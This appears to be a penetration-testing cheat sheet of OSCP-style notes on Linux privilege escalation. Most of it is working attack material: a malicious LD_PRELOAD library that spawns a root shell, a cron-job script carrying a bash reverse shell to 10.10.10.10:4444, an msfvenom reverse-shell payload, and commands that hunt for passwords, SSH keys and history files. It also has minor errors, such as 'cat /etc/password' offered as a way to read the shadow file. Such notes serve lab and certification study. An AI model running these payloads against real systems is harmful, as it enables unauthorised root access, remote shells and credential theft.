---
title: Linux Privilege Escalation 
---
## Links
https://cd6629.gitbook.io/oscp-notes/linux-privesc#path-environment-variable
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html

## Service Exploits
Check vulnerable service running as root (web servers, mail servers, database servers,...etc)
```bash+
ps -elf | grep root

ps -ef | grep 'apache2' | grep -v `whoami` | grep -v root | head -n1 | awk '{print $1}'
```
Example MySQL as the root user without a password defined

https://recipeforroot.com/mysql-to-system-root/
## Bypass Sudo
### Shell Escape Sequences
Lists all commands the user can use with sudo permissions
```bash+
sudo -l
cat /etc/sudoers
```
Is it possbile to run a program with sudo without password?

We can become root by: https://gtfobins.github.io/
### Envarioment Variable (LD_PRELOAD)
LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.

```bash+
user@debian:~$ sudo -l 
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
```
Malicios object file. 
```bash
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Lest compile and make object file.
```bash+
gcc -fPIC -shared -o evil.so evil.c -nostartfiles
```
Copy the file in the tmp folder and run the command have you allowed to do with sudo.
```bash+
sudo LD_PRELOAD=/tmp/evil.so <COMMAND>
```
## SUID Executables
An SUID is a file that allows a user to execute the file with the permissions of the file owner, an SGID is the same except with the group owner. If the owner is root, we can essentially run files with root permissions.

SUID bit is represented by an s.
```bash+
-rwsr-sr-x 1 root root 16712 Dec 26 19:02 suid
```
Search for vulnerble SUID file
```bash
python suid3num.py
```
See if you can indetify a vulnerable SUID bin. 
```bash
https://gtfobins.github.io/
```
## Cronjobs 
Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View system-wide cron tables
```bash+
cat /etc/crontab
```
### File Permission
Search for cron job schedule that should run evey minute. Do you have write permission for this file? If yes modify the file with you payload.

Example:
```bash+
* * * * /tmp/overwrite.sh
```
Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your kali box
```bash+
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```
Set up a netcat listner and wait for the cron job to run. 
### PATH Environment Variable
Search for a script without the absolute path define. See if you have access in one of the directory specify in PATH. 

Example:
```bash+
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
*  *  *  *  *   root    overwrite.sh
```
The system looks for the file with this order: /tmp, /user/local/sbin, /usr/local/bin..etc. 
If you have privilege you can try to overwrite the file directoly or rename the file if you have permission in the directory. 
## Code Execution via Shared Object Library Loading
Haijacking Dynamically Linked Shared Object Libraries (.so files) is another method we can use to obtain privilege on linux. 

When an application that uses shared libraries runs, the OS searches for the library in the following order:

1) Any directories specified by rpath-link options (directories specified by rpath-link options are only effective at link time)
2) Any directories specified by –rpath options (directories specified by rpath options are included in the executable and used at runtime)
3) LD_RUN_PATH
4) LD_LIBRARY_PATH
5) Directories in the DT_RUNPATH or DT_RPATH.(DT_RPATH entries are ignored if DT_RUNPATH entries exist)
6) /lib and /usr/lib
7) Directories within /etc/ld.so.conf


The following attack paths can be followed to identify if a binary that uses shared libraries is going to be vulnerable to attack:

![](https://i.imgur.com/SCMJBcZ.png)

Shared Object Payload
```bash+
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f elf-so -o program.so
```

*Note: Shared Object Library Loading has to be use in combination with a executable file running as root. it is necessary to have sudo or SUID for the bin file.*
## Passwrods & Keys
Can we rea configuration files that might contain sensitive information, passwords,etc..?
```bash
grep "password" /etc/*.conf 2> /dev/null
```
Can we read the shadow file?
```bash+
cat /etc/password
```
Can we least or read the contents of the /root directorty?
```bash+
ls -als /root
```
Can we read other users' history file?
```bash+
find /* -name *.*history* print 2>/dev/null
```
ssh keys
```bash+
find / -type f \( -name "*id_rsa*" -o -name "*authorized_keys*" -o -name "*identity*" -o -name "*id_dsa*" -o -name "*ssh_config*" -o -name "*ssh_host_dsa_key*" -o -name "*ssh_host_key*" \) 2> /dev/null | grep "ssh"
```
## Kernel Exploit
Kernel version:
```bash+
uname -a
cat /proc/version
cat /etc/issue
```
Precompiled exploits
```bash
https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploitskernel-exploits
https://github.com/lucyoa/kernel-exploits
```
## Restricted Shell
Restricted shells are simply shells with restricted permissions, features, or commands
```bash
https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/
```